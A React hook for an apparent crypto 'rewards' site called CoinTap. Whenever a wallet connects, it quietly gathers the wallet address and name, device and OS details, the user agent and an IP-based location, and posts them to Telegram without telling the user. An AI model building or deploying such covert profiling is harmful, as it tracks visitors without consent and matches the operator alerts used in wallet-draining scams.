import { useEffect } from 'react';
import { useAccount } from 'wagmi';
import useSendTelegramMessage from './sendTelegramMessage';
import moment from 'moment';

function useWalletConnectNotification() {
  const { address, isConnected, connector } = useAccount();
  const { sendTelegramMessage } = useSendTelegramMessage();

  useEffect(() => {
    if (isConnected && address && connector) {
      const getDeviceInfo = () => {
        const userAgent = navigator.userAgent;
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        const isDesktop = !isMobile;
        
        let deviceType = 'Unknown';
        let os = 'Unknown';
        
        if (isMobile) {
          if (/Android/i.test(userAgent)) {
            deviceType = 'Mobile';
            os = 'Android';
          } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            deviceType = 'Mobile';
            os = 'iOS';
          }
        } else if (isDesktop) {
          deviceType = 'Desktop';
          if (/Windows/i.test(userAgent)) {
            os = 'Windows';
          } else if (/Mac/i.test(userAgent)) {
            os = 'macOS';
          } else if (/Linux/i.test(userAgent)) {
            os = 'Linux';
          }
        }

        return { deviceType, os, userAgent };
      };

      const getLocationInfo = async () => {
        try {
          // Get approximate location from IP (optional)
          const response = await fetch('https://ipapi.co/json/');
          const data = await response.json();
          return `${data.city || 'Unknown'}, ${data.country || 'Unknown'}`;
        } catch (error) {
          return 'Location unavailable';
        }
      };

      const sendConnectionNotification = async () => {
        const { deviceType, os } = getDeviceInfo();
        const location = await getLocationInfo();
        const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
        const date = moment().format('dddd, MMMM Do YYYY');
        
        const walletName = connector?.name || 'Unknown Wallet';
        const walletType = connector?.type || 'Unknown Type';
        
        const message = `🔗 WALLET CONNECTION NOTIFICATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 WALLET DETAILS:
• Wallet: ${walletName}
• Type: ${walletType}
• Address: ${address}

🕐 CONNECTION INFO:
• Time: ${timestamp}
• Date: ${date}
• Location: ${location}

💻 DEVICE INFO:
• Device: ${deviceType}
• OS: ${os}
• User Agent: ${navigator.userAgent}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ CoinTap - Multi-chain Rewards Platform`;

        try {
          await sendTelegramMessage(message);
        } catch (error) {
          console.error('Failed to send wallet connection notification:', error);
        }
      };

      sendConnectionNotification();
    }
  }, [isConnected, address, connector, sendTelegramMessage]);
}

export default useWalletConnectNotification;
